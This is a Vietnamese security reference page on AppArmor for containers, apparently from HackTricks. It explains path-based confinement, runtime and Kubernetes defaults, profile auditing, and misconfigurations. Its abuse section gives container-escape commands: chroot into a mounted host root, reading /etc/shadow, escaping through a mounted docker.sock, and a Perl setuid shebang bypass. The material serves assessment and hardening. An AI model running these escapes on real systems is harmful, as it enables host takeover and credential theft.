# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Tổng quan

AppArmor là hệ thống **Mandatory Access Control** áp dụng các hạn chế thông qua profile riêng cho từng chương trình. Khác với các kiểm tra DAC truyền thống, vốn phụ thuộc nhiều vào quyền sở hữu của người dùng và nhóm, AppArmor cho phép kernel thực thi chính sách gắn với chính tiến trình đó. Trong môi trường container, điều này rất quan trọng vì workload có thể có đủ quyền truyền thống để thử thực hiện một hành động nhưng vẫn bị từ chối vì profile AppArmor không cho phép truy cập đường dẫn, mount, hành vi mạng hoặc sử dụng capability liên quan.

Điểm quan trọng nhất về mặt khái niệm là AppArmor **dựa trên đường dẫn**. Nó xét quyền truy cập filesystem thông qua các quy tắc đường dẫn thay vì thông qua nhãn như SELinux. Cách này dễ tiếp cận và mạnh mẽ, nhưng cũng đồng nghĩa với việc cần chú ý kỹ đến bind mount và các cách bố trí đường dẫn thay thế. Nếu cùng một nội dung trên host có thể được truy cập qua một đường dẫn khác, tác động của chính sách có thể không giống như điều người vận hành dự tính ban đầu.

## Vai trò trong việc cô lập container

Các bài đánh giá bảo mật container thường chỉ dừng lại ở capabilities và seccomp, nhưng AppArmor vẫn có vai trò sau những bước kiểm tra đó. Hãy hình dung một container có nhiều quyền hơn mức cần thiết, hoặc một workload cần thêm một capability vì lý do vận hành. AppArmor vẫn có thể giới hạn quyền truy cập file, hành vi mount, mạng và các kiểu thực thi để ngăn chặn những con đường lạm dụng rõ ràng. Vì vậy, việc tắt AppArmor "chỉ để ứng dụng chạy được" có thể âm thầm biến một cấu hình vốn chỉ tiềm ẩn rủi ro thành cấu hình có thể bị khai thác trực tiếp.

## Lab

Để kiểm tra AppArmor có đang hoạt động trên host hay không, hãy dùng:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Để xem tiến trình container hiện tại đang chạy dưới quyền nào:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

Sự khác biệt này rất đáng lưu ý. Trong trường hợp bình thường, tiến trình sẽ hiển thị ngữ cảnh AppArmor gắn với profile do runtime chọn. Trong trường hợp không bị giới hạn, lớp hạn chế bổ sung đó sẽ biến mất.

Bạn cũng có thể kiểm tra những gì Docker cho rằng nó đã áp dụng:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Cách sử dụng khi chạy

Docker có thể áp dụng profile AppArmor mặc định hoặc tùy chỉnh khi host hỗ trợ. Podman cũng có thể tích hợp với AppArmor trên các hệ thống sử dụng AppArmor, mặc dù trên các bản phân phối ưu tiên SELinux, hệ thống MAC còn lại thường đóng vai trò chính. Kubernetes có thể áp dụng policy AppArmor ở cấp workload trên các node thực sự hỗ trợ AppArmor. LXC và các môi trường system-container liên quan thuộc họ Ubuntu cũng sử dụng AppArmor rộng rãi.

Điểm thực tế là AppArmor không phải là một "tính năng của Docker". Đây là tính năng của host-kernel mà một số runtime có thể chọn áp dụng. Nếu host không hỗ trợ hoặc runtime được cấu hình để chạy ở chế độ unconfined, thì lớp bảo vệ được cho là có sẽ không thực sự tồn tại.

Riêng với Kubernetes, API hiện đại là `securityContext.appArmorProfile`. Kể từ Kubernetes `v1.30`, các AppArmor annotation beta cũ đã bị deprecated. Trên các host được hỗ trợ, `RuntimeDefault` là profile mặc định, còn `Localhost` trỏ đến một profile phải được tải sẵn trên node. Điều này quan trọng khi đánh giá vì manifest có thể trông như đã cấu hình AppArmor nhưng vẫn phụ thuộc hoàn toàn vào hỗ trợ phía node và các profile được tải sẵn.<sup>[[1]](#references)</sup>

Một chi tiết vận hành tinh tế nhưng hữu ích là đặt rõ `appArmorProfile.type: RuntimeDefault` sẽ chặt chẽ hơn so với việc bỏ qua trường này. Nếu trường được đặt rõ ràng mà node không hỗ trợ AppArmor, quá trình admission sẽ thất bại. Nếu bỏ qua trường này, workload vẫn có thể chạy trên node không có AppArmor và đơn giản là không nhận thêm lớp giới hạn đó. Từ góc nhìn của attacker, đây là lý do nên kiểm tra cả manifest lẫn trạng thái thực tế của node.<sup>[[1]](#references)</sup>

Trên các host Docker hỗ trợ AppArmor, profile mặc định nổi tiếng nhất là `docker-default`. Profile này được tạo từ template AppArmor của Moby và rất quan trọng vì nó giải thích tại sao một số PoC dựa trên capability vẫn thất bại trong container mặc định. Nói chung, `docker-default` cho phép hoạt động mạng thông thường, từ chối ghi vào phần lớn `/proc`, từ chối truy cập các phần nhạy cảm của `/sys`, chặn thao tác mount và giới hạn ptrace để nó không trở thành một primitive dò xét host tổng quát. Hiểu rõ baseline này giúp phân biệt giữa "container có `CAP_SYS_ADMIN`" và "container thực sự có thể dùng capability đó trên các giao diện kernel mà tôi quan tâm".

## Quản lý profile

Các profile AppArmor thường được lưu trong `/etc/apparmor.d/`. Một quy ước đặt tên phổ biến là thay dấu gạch chéo trong đường dẫn executable bằng dấu chấm. Ví dụ, profile cho `/usr/bin/man` thường được lưu tại `/etc/apparmor.d/usr.bin.man`. Chi tiết này hữu ích khi phòng thủ cũng như đánh giá vì khi biết tên profile đang hoạt động, bạn thường có thể nhanh chóng tìm thấy file tương ứng trên host.

Các lệnh quản lý hữu ích ở phía host bao gồm:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

Lý do các lệnh này quan trọng trong tài liệu tham khảo về bảo mật container là chúng giải thích cách tạo profile, tải profile, chuyển sang complain mode và chỉnh sửa profile sau khi ứng dụng thay đổi. Nếu quản trị viên có thói quen chuyển profile sang complain mode khi khắc phục sự cố rồi quên bật lại chế độ enforcement, container có thể trông như được bảo vệ theo tài liệu nhưng thực tế lại hoạt động với mức hạn chế lỏng lẻo hơn nhiều.

### Tạo Và Cập Nhật Profile

`aa-genprof` có thể theo dõi hành vi của ứng dụng và hỗ trợ tạo profile theo cách tương tác:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` có thể tạo một hồ sơ mẫu để sau này tải bằng `apparmor_parser`:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

Khi binary thay đổi và policy cần được cập nhật, `aa-logprof` có thể phát lại các lần từ chối được ghi trong log và hỗ trợ người vận hành quyết định cho phép hay từ chối chúng:

```bash
sudo aa-logprof
```

### Nhật ký

Các lần từ chối của AppArmor thường hiển thị qua `auditd`, syslog hoặc các công cụ như `aa-notify`:

```bash
sudo aa-notify -s 1 -v
```

Điều này hữu ích về mặt vận hành và tấn công. Người phòng thủ dùng nó để tinh chỉnh các profile. Kẻ tấn công dùng nó để tìm hiểu chính xác đường dẫn hoặc thao tác nào đang bị từ chối, cũng như liệu AppArmor có phải là cơ chế kiểm soát đang chặn chuỗi khai thác hay không.

### Xác định chính xác tệp profile

Khi runtime hiển thị tên profile AppArmor cụ thể cho một container, việc ánh xạ tên đó về tệp profile trên đĩa thường rất hữu ích:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

Điều này đặc biệt hữu ích khi rà soát từ phía host vì nó thu hẹp khoảng cách giữa “container cho biết nó đang chạy dưới profile `lowpriv`” và “các quy tắc thực tế nằm trong tệp cụ thể này, có thể được kiểm tra hoặc tải lại”.

### Các quy tắc quan trọng cần kiểm tra

Khi có thể đọc một profile, đừng chỉ dừng lại ở các dòng `deny` đơn giản. Một số loại quy tắc có thể ảnh hưởng đáng kể đến mức độ hữu ích của AppArmor trong việc chống lại nỗ lực thoát khỏi container:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: thực thi binary đích mà không bị giới hạn. Nếu một helper, shell hoặc interpreter có thể truy cập được và được cho phép bằng `ux`, đây thường là điều đầu tiên cần kiểm tra.
- `px` / `Px` và `cx` / `Cx`: thực hiện chuyển đổi profile khi exec. Những quy tắc này không mặc nhiên là xấu, nhưng đáng để kiểm tra vì việc chuyển đổi có thể đưa tiến trình vào một profile rộng hơn nhiều so với profile hiện tại.
- `change_profile`: cho phép một task chuyển sang profile khác đã được tải, ngay lập tức hoặc ở lần exec tiếp theo. Nếu profile đích yếu hơn, đây có thể trở thành lối thoát được chủ ý tạo ra khỏi một domain hạn chế.
- `flags=(complain)`, `flags=(unconfined)` hoặc `flags=(prompt)` mới hơn: các cờ này sẽ ảnh hưởng đến mức độ tin cậy bạn đặt vào profile. `complain` ghi log các lần từ chối thay vì thực thi chúng, `unconfined` loại bỏ ranh giới bảo vệ, còn `prompt` phụ thuộc vào quy trình quyết định ở userspace thay vì chỉ dựa vào cơ chế từ chối do kernel thực thi.
- `userns` hoặc `userns create,`: các policy AppArmor mới hơn có thể kiểm soát việc tạo user namespace. Nếu profile container cho phép rõ ràng điều này, user namespace lồng nhau vẫn có thể được sử dụng ngay cả khi nền tảng dùng AppArmor như một phần trong chiến lược hardening.

Lệnh grep hữu ích từ phía host:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Loại kiểm tra này thường hữu ích hơn nhiều so với việc xem hàng trăm quy tắc file thông thường. Nếu một breakout phụ thuộc vào việc thực thi một helper, vào một namespace mới hoặc thoát sang một profile ít hạn chế hơn, câu trả lời thường nằm trong các quy tắc thiên về chuyển đổi này, thay vì trong những dòng hiển nhiên như `deny /etc/shadow r`.

## Cấu hình sai

Lỗi rõ ràng nhất là `apparmor=unconfined`. Quản trị viên thường đặt tùy chọn này khi debug một ứng dụng bị lỗi vì profile đã chặn đúng một thao tác nguy hiểm hoặc không mong muốn. Nếu cờ này vẫn được giữ trong môi trường production, toàn bộ lớp MAC về cơ bản đã bị vô hiệu hóa.

Một vấn đề tinh vi khác là cho rằng bind mount vô hại vì quyền truy cập file trông bình thường. Vì AppArmor dựa trên đường dẫn, việc để lộ các đường dẫn host ở những vị trí mount thay thế có thể tương tác không tốt với các quy tắc đường dẫn. Lỗi thứ ba là quên rằng tên profile trong file cấu hình hầu như không có ý nghĩa gì nếu kernel của host thực sự không thực thi AppArmor.

## Lạm dụng

Khi AppArmor không còn, những thao tác trước đây bị hạn chế có thể đột nhiên thực hiện được: đọc các đường dẫn nhạy cảm thông qua bind mount, truy cập những phần của procfs hoặc sysfs vốn khó sử dụng hơn, thực hiện các thao tác liên quan đến mount nếu capabilities/seccomp cũng cho phép, hoặc dùng các đường dẫn mà profile thường sẽ chặn. AppArmor thường là cơ chế giải thích vì sao một nỗ lực breakout dựa trên capability “đáng lẽ phải hoạt động” trên lý thuyết nhưng thực tế vẫn thất bại. Loại bỏ AppArmor, và cùng nỗ lực đó có thể bắt đầu thành công.

Nếu nghi ngờ AppArmor là yếu tố chính ngăn chặn một chuỗi lạm dụng dựa trên path-traversal, bind mount hoặc mount, bước đầu tiên thường là so sánh những gì có thể truy cập khi có và không có profile. Ví dụ, nếu một đường dẫn host được mount bên trong container, trước tiên hãy kiểm tra xem bạn có thể đi qua và đọc đường dẫn đó không:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

Nếu container cũng có capability nguy hiểm như `CAP_SYS_ADMIN`, một trong những cách kiểm tra thiết thực nhất là xác định liệu AppArmor có phải là cơ chế kiểm soát đang chặn các thao tác mount hoặc truy cập vào các filesystem nhạy cảm của kernel hay không:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

Trong các môi trường mà đường dẫn trên host đã khả dụng thông qua bind mount, việc mất AppArmor cũng có thể biến một lỗi tiết lộ thông tin chỉ đọc thành khả năng truy cập trực tiếp các tệp trên host:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

Mục đích của các lệnh này không phải là AppArmor tự nó tạo ra lối thoát khỏi container. Mà là khi AppArmor bị gỡ bỏ, nhiều đường tấn công lạm dụng filesystem và mount có thể được kiểm tra ngay lập tức.

### Ví dụ đầy đủ: AppArmor bị vô hiệu hóa + root của host được mount

Nếu container đã có root của host được bind-mount tại `/host`, việc gỡ bỏ AppArmor có thể biến một đường tấn công lạm dụng filesystem vốn bị chặn thành lối thoát hoàn toàn khỏi host:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Khi shell thực thi thông qua hệ thống tệp của host, workload về cơ bản đã thoát khỏi ranh giới container:

```bash
id
hostname
cat /etc/shadow | head
```

### Ví dụ đầy đủ: AppArmor bị vô hiệu hóa + Socket của runtime

Nếu rào cản thực sự là AppArmor bảo vệ trạng thái runtime, thì một socket được mount có thể đủ để thoát hoàn toàn:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Đường dẫn chính xác phụ thuộc vào điểm mount, nhưng kết quả cuối cùng vẫn như nhau: AppArmor không còn ngăn cản việc truy cập runtime API, và runtime API có thể khởi chạy một container xâm phạm host.

### Ví dụ đầy đủ: Bypass bind-mount dựa trên đường dẫn

Vì AppArmor dựa trên đường dẫn, việc bảo vệ `/proc/**` không tự động bảo vệ cùng nội dung procfs của host khi nội dung đó có thể được truy cập qua một đường dẫn khác:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

Tác động phụ thuộc vào chính xác những gì được mount và liệu đường dẫn thay thế có đồng thời vượt qua các biện pháp kiểm soát khác hay không, nhưng mô hình này là một trong những lý do rõ ràng nhất cho thấy AppArmor phải được đánh giá cùng với bố cục mount, thay vì tách biệt.

### Ví dụ đầy đủ: Shebang Bypass

AppArmor có thể gắn profile với đường dẫn của script được thực thi, thay vì với interpreter được chỉ định trong shebang. Ngược lại, gọi trực tiếp interpreter có thể chọn profile của interpreter đó. Một [người duy trì AppArmor mô tả sự khác biệt này](https://bugs.launchpad.net/apparmor/+bug/1911431). Một ví dụ lịch sử liên quan đến một script có dòng đầu tiên trỏ đến một interpreter bị giới hạn:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

Ví dụ này chỉ là một trường hợp có thể xảy ra, trong đó capability trên file của interpreter có thể trở nên hiệu lực và attachment exec thực tế của script cho phép thao tác này. Hãy kiểm tra policy đã được tải và process label, capability bounding set, `no_new_privs` và trạng thái `nosuid` của mount; chỉ riêng tên file profile hoặc danh sách `cap_setuid+ep` không chứng minh rằng có thể thực hiện chuyển đổi. Cần xem xét riêng các chuỗi interpreter và những đường thực thi thay thế.

## Checks

Mục tiêu của các bước kiểm tra này là nhanh chóng trả lời ba câu hỏi: AppArmor có được bật trên host không, process hiện tại có bị giới hạn không và runtime có thực sự áp dụng profile cho container này không?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Điều đáng chú ý ở đây:

- Nếu `/proc/self/attr/current` hiển thị `unconfined`, workload không được hưởng cơ chế giới hạn của AppArmor.
- Nếu `aa-status` cho biết AppArmor bị tắt hoặc chưa được tải, mọi tên profile trong cấu hình runtime hầu như chỉ mang tính hình thức.
- Nếu `docker inspect` hiển thị `unconfined` hoặc một profile tùy chỉnh không mong đợi, đó thường là lý do khiến một đường khai thác dựa trên filesystem hoặc mount hoạt động.
- Nếu `/sys/kernel/security/apparmor/profiles` không chứa profile bạn mong đợi, thì riêng cấu hình runtime hoặc orchestrator là chưa đủ.
- Nếu một profile được cho là đã tăng cường bảo mật lại chứa các quy tắc kiểu `ux`, `change_profile` quá rộng, `userns` hoặc `flags=(complain)`, ranh giới bảo mật trên thực tế có thể yếu hơn nhiều so với tên profile gợi ý.

Nếu một container đã có đặc quyền cao vì lý do vận hành, việc giữ AppArmor bật thường tạo nên khác biệt giữa một ngoại lệ được kiểm soát và một sự cố bảo mật trên diện rộng hơn.

## Mặc định của runtime

| Runtime / nền tảng | Trạng thái mặc định | Hành vi mặc định | Cách làm suy yếu phổ biến khi cấu hình thủ công |
| --- | --- | --- | --- |
| Docker Engine | Được bật mặc định trên các host hỗ trợ AppArmor | Sử dụng profile AppArmor `docker-default` trừ khi bị ghi đè | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Phụ thuộc vào host | AppArmor được hỗ trợ thông qua `--security-opt`, nhưng mặc định cụ thể phụ thuộc vào host/runtime và không phổ biến như profile `docker-default` được Docker ghi nhận | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Mặc định có điều kiện | Nếu không chỉ định `appArmorProfile.type`, giá trị mặc định là `RuntimeDefault`, nhưng chỉ được áp dụng khi AppArmor được bật trên node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` với profile yếu, các node không hỗ trợ AppArmor |
| containerd / CRI-O trong Kubernetes | Phụ thuộc vào hỗ trợ của node/runtime | Các runtime phổ biến được Kubernetes hỗ trợ có hỗ trợ AppArmor, nhưng việc thực thi thực tế vẫn phụ thuộc vào hỗ trợ của node và cấu hình workload | Như hàng Kubernetes; cấu hình runtime trực tiếp cũng có thể bỏ qua AppArmor hoàn toàn |

Với AppArmor, biến số quan trọng nhất thường là **host**, chứ không chỉ là runtime. Thiết lập profile trong manifest không tạo ra cơ chế giới hạn trên một node chưa bật AppArmor.

## References

- [1] [Ngữ cảnh bảo mật Kubernetes: các trường profile AppArmor và hành vi hỗ trợ của node](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Trang hướng dẫn `apparmor.d(5)` của Ubuntu 24.04: chuyển tiếp khi thực thi, `change_profile`, `userns` và các cờ profile](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
